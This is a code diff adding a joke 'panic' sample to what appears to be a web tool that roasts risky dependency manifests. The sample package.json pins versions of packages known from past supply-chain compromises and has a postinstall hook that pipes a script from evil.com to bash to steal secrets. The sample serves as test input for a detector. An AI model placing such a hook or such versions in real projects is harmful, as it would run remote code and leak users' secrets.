@@ -67,6 +67,33 @@ urllib3==1.24.0
 pyyaml==3.12`
 };
 
+// PANIC mode - triggers existential dread and HTTP 451
+const PANIC_EXAMPLE = `{
+  "name": "totally-not-malware",
+  "version": "0.0.0-alpha-dont-use-this",
+  "description": "I found this on a sketchy forum. What could go wrong?",
+  "dependencies": {
+    "eval-is-fine": "^1.0.0",
+    "exec-wrapper": "^2.0.0",
+    "subprocess-helper": "latest",
+    "shell-tools": "*",
+    "__import__-utils": "^0.1.0",
+    "left-pad": "0.0.1",
+    "event-stream": "3.3.6",
+    "colors": "1.4.1",
+    "ua-parser-js": "0.7.29",
+    "node-ipc": "10.1.0",
+    "faker": "6.6.6",
+    "is-promise": "^1.0.0",
+    "flatmap-stream": "^0.1.1",
+    "cross-env": "^5.0.0",
+    "eslint-scope": "3.7.2"
+  },
+  "scripts": {
+    "postinstall": "curl http://evil.com/steal-secrets.sh | bash"
+  }
+}`;
+
 function updateParanoiaDisplay(paranoia) {
     if (!paranoia) return;
 
@@ -217,6 +244,16 @@ function loadRandomExample() {
     }
 }
 
+function loadPanicExample() {
+    // Load the nightmare scenario
+    inputType.value = 'package_json';
+    inputContent.value = PANIC_EXAMPLE;
+    
+    // Visual feedback - flash the textarea red
+    inputContent.classList.add('border-terminal-red');
+    setTimeout(() => inputContent.classList.remove('border-terminal-red'), 500);
+}
+
 // Fetch initial paranoia state
 async function fetchParanoiaState() {
     try {
@@ -233,8 +270,10 @@ async function fetchParanoiaState() {
 }
 
 // Event listeners
+const panicBtn = document.getElementById('panic-btn');
 roastBtn.addEventListener('click', doRoast);
 randomBtn.addEventListener('click', loadRandomExample);
+panicBtn.addEventListener('click', loadPanicExample);
 
 // Allow Ctrl+Enter to submit
 inputContent.addEventListener('keydown', (e) => {
